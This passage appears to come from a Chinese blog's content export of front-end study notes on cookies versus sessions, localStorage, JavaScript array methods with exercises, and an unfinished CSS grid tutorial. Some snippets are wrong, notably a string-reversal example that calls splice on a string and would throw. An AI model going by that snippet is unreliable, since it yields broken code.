<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="1、什么是cookie"><a href="#1、什么是cookie" class="headerlink" title="1、什么是cookie"></a>1、什么是cookie</h2><p>cookie是服务器发送到用户浏览器并保存在本地的一小块数据，用来记录某些当页面关闭或刷新后仍需记录的信息，它会在下一次浏览器向同一服务器发送请求时携带并发送给该服务器，在控制台用 document.cookie 可以查看当前正在浏览的网站cookie</p>
<p>要点：</p>
<ul>
<li>服务器通过 set-cookie 头给客户端一串字符串</li>
<li>浏览器每次访问相同域名的页面时必须带上 cookie 作为请求头（Request-Header）</li>
<li>cookie一般用来记录用户信息，默认在关闭页面后失效，后台代码可以设置cookie的过期时间</li>
</ul>
<h2 id="2、cookie用例"><a href="#2、cookie用例" class="headerlink" title="2、cookie用例"></a>2、cookie用例</h2><p>以注册登录为例：<br>1、注册账号时，服务器把你的用户名和密码存入数据库</p>
<p>2、登陆的时候，浏览器发送post请求，服务器把你的账号密码跟数据库里的做匹配，若匹配成功，则发送一个响应头给浏览器，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: sign_in_email=xxx@xxx.com</span><br></pre></td></tr></table></figure></p>
<p>3、这就是cookie，里面记录着你的登陆信息，浏览器会在一段时间内保存cookie</p>
<p>4、当你再访问相同域名的网页时，浏览器会带着这个cookie发请求，服务器会将cookie里的信息和数据库匹配，若匹配上了，则直接发送给你已经登陆上的页面</p>
<p>5、cookie默认在关闭页面后被清除，而后台可以设置cookie的过期时间</p>
<h2 id="3、Cookie的分类"><a href="#3、Cookie的分类" class="headerlink" title="3、Cookie的分类"></a>3、Cookie的分类</h2><p>浏览器所持有的cookie分为两种：</p>
<ul>
<li>Session Cookie（会话期即非持久Cookie）：是最简单的cookie，它不需要指定过期时间（expires）或是有效期（Max-Age），它仅在会话期内有效，浏览器关闭后它会被自动删除</li>
<li>Permanent Cookie（持久性Cookie）：可以指定过期时间或有效期</li>
</ul>
<p>设置cookie过期时间：</p>
<ul>
<li><p>setMaxAge</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie.setMaxAge(60*60)  // 过期时间为1小时</span><br></pre></td></tr></table></figure>
</li>
<li><p>expires(不要用)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: name=Nicholas; expires=Sat, 02 May 2009 23:38:25 GMT  //星期六 5月2号 2009年 23:38:25时过期</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>因为expires设置是根据本地时间，但各个地方时区不同设置时容易造成混乱</p>
<h2 id="4、Cookie的作用："><a href="#4、Cookie的作用：" class="headerlink" title="4、Cookie的作用："></a>4、Cookie的作用：</h2><ul>
<li>保存用户登录状态：例如将用户ID储存在一个cookie内，这样用户在下次访问该页面的时候就不需要重新登录了，常见于很多论坛或社区，还可以设置过期时间，当超过这个期限，cookie会自动消失。因此，系统往往可以提示用户保持登录状态的时间，常见的有一个月、三个月、一年等</li>
<li>跟踪用户行为：例如一个天气预报网站，能根据用户选择的地区显示当地天气情况，但如果每次都需要用户选择所在地十分不人性化，当利用了cookie系统就能记住上一次访问的地区，当下次打开页面时，就会自动显示上次用户所在地区的天气情况</li>
<li>定制页面：如果网站提供了换肤或者更换布局的功能，使用cookie就可以记录下用户的选项，当用户下次访问时，仍然保持的是上一次设置的页面风格</li>
</ul>
<h1 id="cookie和session的区别"><a href="#cookie和session的区别" class="headerlink" title="cookie和session的区别"></a>cookie和session的区别</h1><p>HTTP是一个无状态协议，因此cookie最大的作用就是存储sessionID，用来唯一标识用户</p>
<p>cookie：</p>
<ul>
<li>它是由服务器通过Set-Cookie发送给浏览器的一串字符串构成</li>
<li>cookie被保存在客户端，并且每次都会随请求发送给服务器</li>
<li>没有session之前，cookie里记录了用户信息，任何人可读可写，十分不安全</li>
</ul>
<p>session：</p>
<ul>
<li>session是依附于cookie而存在的</li>
<li>服务器通过 session 给用户一个 sessionID ，sessionID 对应服务器中的一小块内存（一般是一个随机数），通过 set-cookie 添加到http响应头部中</li>
<li>浏览器发送请求时会带上cookie，服务器通过sessionID来识别用户</li>
<li>这样暴露给其他人的只有一个随机数sessionID，增加安全性</li>
</ul>
<h1 id="localStorage和sessionStorage"><a href="#localStorage和sessionStorage" class="headerlink" title="localStorage和sessionStorage"></a>localStorage和sessionStorage</h1><p>localStorage</p>
<p>localStorage是html5提供的一个本地存储web storage特性的API，实质上是一个哈希，有setItem、getItem、clear等属性</p>
<ul>
<li>localStorage 与 http 无关，HTTP不会带上localStorage的值</li>
<li>只有相同域名的页面才能互相读取 localStorage</li>
<li>经常在记录某个信息有没有提示给用户时用到</li>
<li>localStorage 永久有效，除非用户清理缓存</li>
</ul>
<p>sessionStorage 与 localStorage 唯一一点区别是，sessionStorage 在用户关闭页面后就会失效</p>
<h1 id="localStorage与cookie的区别"><a href="#localStorage与cookie的区别" class="headerlink" title="localStorage与cookie的区别"></a>localStorage与cookie的区别</h1><ul>
<li>cookie会随请求被发送到服务器上，但localStorage不会</li>
<li>cookie大小一般在4k左右，localStorage一般5MB左右（服务器不同也会有所不同）</li>
</ul>
]]></content>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>JS数组</title>
    <url>/2022/03/15/JS%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JS中的数组"><a href="#JS中的数组" class="headerlink" title="JS中的数组"></a>JS中的数组</h2><ul>
<li>元素的数据类型可以不同</li>
<li>内存不一定连续，对象是随机存储的</li>
<li>不能通过数字下标，而是字符串下标</li>
<li>数组可以有任何的key</li>
</ul>
<hr>
<h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><ul>
<li><p>新建</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)  <span class="comment">// 数组元素为1,2,3</span></span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>)  <span class="comment">// 数组长度为3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>转化</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="string">'1,2,3'</span>.split(<span class="string">','</span>);</span><br><span class="line"><span class="keyword">let</span> arr = <span class="string">'123'</span>.split(<span class="string">''</span>);</span><br><span class="line"><span class="built_in">Array</span>.from(<span class="string">'123'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>伪数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> divList = <span class="built_in">document</span>.querySelectorAll(<span class="string">'div'</span>);  <span class="comment">// 这是一个伪数组</span></span><br><span class="line"><span class="built_in">console</span>.dir(divList);  <span class="comment">// 伪数组的原型链中没有数组的原型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> divArray = <span class="built_in">Array</span>.from(divList);  <span class="comment">// 将伪数组转换成数组</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>合并两个数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr1.concat(arr2);  <span class="comment">// 得到一个新数组，并不会改变arr1和arr2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>截取数组的一部分</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr1.slice(<span class="number">1</span>);  <span class="comment">// 从第二个元素开始截取</span></span><br><span class="line">arr1.slice(<span class="number">0</span>);  <span class="comment">// 浅拷贝（复制）一个数组</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="删除数组元素"><a href="#删除数组元素" class="headerlink" title="删除数组元素"></a>删除数组元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.shift()  <span class="comment">// 删除头部元素，并返回被删除的元素</span></span><br><span class="line">arr.pop()  <span class="comment">// 删除尾部元素，并返回被删除元素</span></span><br><span class="line">arr.splice(<span class="number">0</span>,<span class="number">3</span>)  <span class="comment">// 从第一个元素开始，删除3个元素</span></span><br><span class="line">arr.splice(<span class="number">2</span>,<span class="number">5</span>,<span class="number">666</span>,<span class="number">7777</span>)  <span class="comment">// 从第三个元素开始，删除5个元素，并添加两个新元素666,7777</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h2><ul>
<li><p>查看属性名（字符串）和值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;i&#125;</span> : <span class="subst">$&#123;arr[i]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;y&#125;</span> : <span class="subst">$&#123;x&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>for循环和forEach的不同在于，for循环可以使用break语句来中断遍历</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;i&#125;</span> : <span class="subst">$&#123;arr[i]&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">3</span>) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看单个属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">111</span>,<span class="number">222</span>,<span class="number">333</span>]</span><br><span class="line">arr[<span class="number">0</span>]  <span class="comment">// 111</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>索引越界</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 索引超出了数组长度</span></span><br><span class="line">arr[arr.length] === <span class="literal">undefined</span></span><br><span class="line">arr[<span class="number">-1</span>] === <span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 举例（i不能取值为等于数组长度）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= arr.length ; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[i].toString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 报错：Cannot read property ’toString‘ of undefined，意思为读取了undefined的toString属性，而非toString是undefined。x.toString() 其中 x 为 undefined就报错</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查找某个元素是否在数组里</span></span><br><span class="line">arr.indexOf(item)  <span class="comment">// 存在就返回索引，不存在返回-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用条件查找</span></span><br><span class="line">arr.find(<span class="function"><span class="params">item</span> =&gt;</span> item%<span class="number">2</span>===<span class="number">0</span>) <span class="comment">// 找第一个偶数</span></span><br><span class="line">arr.findIndex(<span class="function"><span class="params">item</span> =&gt;</span> item%<span class="number">2</span>===<span class="number">0</span>)  <span class="comment">// 找第一个偶数的索引</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="增加元素"><a href="#增加元素" class="headerlink" title="增加元素"></a>增加元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在尾部增加元素</span></span><br><span class="line">arr.push(newItem)  <span class="comment">// 修改arr，返回新长度</span></span><br><span class="line">arr.push(item1, item2)  <span class="comment">// 修改arr，返回新长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在头部增加元素</span></span><br><span class="line">arr.unshift(newItem)  <span class="comment">// 修改arr，返回新长度</span></span><br><span class="line">arr.unshift(item1, item2)  <span class="comment">// 修改arr，返回新长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在中间添加元素</span></span><br><span class="line">arr.splice(index,<span class="number">0</span>,<span class="string">'x'</span>)  <span class="comment">// 在index处，一个元素都不删，再插入'x'</span></span><br><span class="line">arr.splice(index,<span class="number">0</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)  <span class="comment">// 在index处，一个元素都不删，再插入'a''b''c'</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反转顺序</span></span><br><span class="line">arr.reverse();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一串字符串倒序</span></span><br><span class="line"><span class="keyword">var</span> cc = <span class="string">'abcde'</span>;</span><br><span class="line">cc.splice(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义数组顺序</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">56</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">33</span>,<span class="number">22</span>]</span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;  <span class="comment">// [1, 3, 4, 8, 11, 11, 22, 33, 56]</span></span><br><span class="line">    <span class="keyword">if</span>( a &gt; b )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>  <span class="comment">// a&gt;b return 1，从小到大排序</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a===b)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;  <span class="comment">// [56, 33, 22, 11, 11, 8, 4, 3, 1]</span></span><br><span class="line">    <span class="keyword">if</span>( a &gt; b )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>  <span class="comment">// a&gt;b return -1，从大到小排序</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a===b)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象根据某个属性值排序</span></span><br><span class="line"><span class="keyword">let</span> arr = [ &#123;<span class="attr">name</span>: <span class="string">'小明'</span>, <span class="attr">score</span>: <span class="number">60</span>&#125;, &#123;<span class="attr">name</span>:<span class="string">'小芳'</span>, <span class="attr">score</span>: <span class="number">55</span>&#125;, &#123;<span class="attr">name</span>: <span class="string">'小花'</span>, <span class="attr">score</span>: <span class="number">69</span>&#125; ];</span><br><span class="line"></span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.score &gt; b.score) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a.score === b.score) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 简单写法</span></span><br><span class="line">arr.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> (a.score - b.score))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="数组变换"><a href="#数组变换" class="headerlink" title="数组变换"></a>数组变换</h2><ol>
<li>map</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    arr[i] = arr[i] * arr[i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用map可以简化for循环的写法</span></span><br><span class="line">arr.map( <span class="function"><span class="params">item</span> =&gt;</span> item*item)  <span class="comment">//得到一个新数组，不改变原数组</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>filter</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line">arr.filter( <span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> === <span class="number">0</span> ? <span class="literal">true</span> : <span class="literal">false</span>)  <span class="comment">// 过滤后留下偶数</span></span><br><span class="line"><span class="comment">// 可以简写为 arr.filter( item =&gt; item % 2 === 0 )</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>reduce</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line">arr1.reduce(<span class="function">(<span class="params">result,item</span>) =&gt;</span> &#123; <span class="keyword">return</span> result.concat(item * item) &#125;,[])  <span class="comment">// [1, 16, 36, 81]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">arr.reduce( <span class="function">(<span class="params">result,item</span>) =&gt;</span> &#123;  <span class="comment">// [1,3,5,7,9]</span></span><br><span class="line">    <span class="keyword">if</span> (item % <span class="number">2</span> === <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> result.concat(item);  <span class="comment">// 奇数就留下</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> result <span class="comment">// 不是奇数就返回之前的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,[])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简便写法</span></span><br><span class="line">arr.reduce( <span class="function">(<span class="params">result,item</span>) =&gt;</span> </span><br><span class="line">    (result.concat(item % <span class="number">2</span> === <span class="number">1</span> ? item : []))  <span class="comment">// [1,3,5,7,9]</span></span><br><span class="line">,[])</span><br></pre></td></tr></table></figure>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><ol>
<li><p>将数字变成星期</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">let</span> arr2 = arr.map(</span><br><span class="line">    item =&gt; &#123; <span class="keyword">return</span> &#123; <span class="number">0</span>:<span class="string">'周日'</span>, <span class="number">1</span>:<span class="string">'周一'</span>, <span class="number">2</span>:<span class="string">'周二'</span>, <span class="number">3</span>:<span class="string">'周三'</span>, <span class="number">4</span>:<span class="string">'周四'</span>, <span class="number">5</span>:<span class="string">'周五'</span>, <span class="number">6</span>:<span class="string">'周六'</span> &#125;[item] &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr2) <span class="comment">// ['周日', '周一', '周二', '周二', '周三', '周三', '周三', '周四', '周四', '周四', '周四','周六']</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找出大于60的数字</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> scores = [<span class="number">95</span>,<span class="number">91</span>,<span class="number">59</span>,<span class="number">55</span>,<span class="number">42</span>,<span class="number">82</span>,<span class="number">72</span>,<span class="number">85</span>,<span class="number">67</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">91</span>]</span><br><span class="line"><span class="keyword">let</span> scores2 = scores.filter( <span class="function"><span class="params">item</span> =&gt;</span> item &gt; <span class="number">60</span> )</span><br><span class="line"><span class="built_in">console</span>.log(scores2) <span class="comment">//  [95,91,82,72,85,67,66, 91]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>算出所有奇数之和</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> scores = [<span class="number">95</span>,<span class="number">91</span>,<span class="number">59</span>,<span class="number">55</span>,<span class="number">42</span>,<span class="number">82</span>,<span class="number">72</span>,<span class="number">85</span>,<span class="number">67</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">91</span>]</span><br><span class="line"><span class="keyword">let</span> sum = scores.reduce(<span class="function">(<span class="params">sum, n</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ( n%<span class="number">2</span> === <span class="number">1</span>) ? sum+n : sum</span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum) <span class="comment">// 奇数之和：598</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将数组变成对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">    &#123; 名称:<span class="string">'动物'</span>, <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">parent</span>: <span class="literal">null</span>&#125;,</span><br><span class="line">    &#123; 名称:<span class="string">'狗'</span>, <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">parent</span>: <span class="number">1</span>&#125;,</span><br><span class="line">    &#123; 名称:<span class="string">'猫'</span>, <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">parent</span>: <span class="number">1</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">将上面的数组变成对象</span><br><span class="line">&#123;</span><br><span class="line">    id: <span class="number">1</span>, 名称: <span class="string">'动物'</span>, <span class="attr">children</span>: [</span><br><span class="line">        &#123;<span class="attr">id</span>: <span class="number">2</span>, 名称:<span class="string">'狗'</span>, <span class="attr">children</span>: <span class="literal">null</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">id</span>: <span class="number">3</span>, 名称:<span class="string">'猫'</span>, <span class="attr">children</span>: <span class="literal">null</span>&#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr.reduce( <span class="function">(<span class="params">result,item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(item.parent === <span class="literal">null</span>) &#123;</span><br><span class="line">    result.id = item.id;</span><br><span class="line">    result[<span class="string">'名称'</span>] = item[<span class="string">'名称'</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    result.children.push(item);</span><br><span class="line">    item.children = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">delete</span> item.parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;,&#123; <span class="attr">id</span>:<span class="literal">null</span>, <span class="attr">children</span>:[]&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>grid布局</title>
    <url>/2018/11/25/grid%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>初学grid布局<br><a id="more"></a></p>
<h2 id="grid布局术语"><a href="#grid布局术语" class="headerlink" title="grid布局术语"></a>grid布局术语</h2><ul>
<li><p>Grid Container<br>设置了 display: grid; 的元素，他是所有grid item的直接父项，如下面的.container</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item item-3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Grid Item<br>Grid容器的直接子元素，如下的item，但注意sub-item不是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"sub-item"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Grid Line<br>网格线，可以是垂直的也可以是水平的</p>
</li>
<li><p>Grid Track<br>两个相邻网格线之间的空间，可以想象成网格的列或行</p>
</li>
<li><p>Grid Cell<br>代表了一个网格单元</p>
</li>
<li><p>Grid Area<br>网格区域，可以由任意数量的网格单元组成</p>
</li>
</ul>
<h2 id="列表属性"><a href="#列表属性" class="headerlink" title="列表属性"></a>列表属性</h2><h3 id="父容器Grid-Container"><a href="#父容器Grid-Container" class="headerlink" title="父容器Grid Container"></a>父容器Grid Container</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line">        width: 400px;</span><br><span class="line">        height: 300px;</span><br><span class="line">        border: 1px solid pink;</span><br><span class="line"></span><br><span class="line">        display: grid;</span><br><span class="line">        grid-template-columns: 10% auto 10%;</span><br><span class="line">        grid-template-rows: 50px auto 50px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://wx3.sinaimg.cn/large/9f1d2bbagy1fxmrerwrfgj21fg13kn0s.jpg" alt="image"></p>
<h3 id="子元素Grid-Items"><a href="#子元素Grid-Items" class="headerlink" title="子元素Grid Items"></a>子元素Grid Items</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span>header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>main<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span>aside<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span> 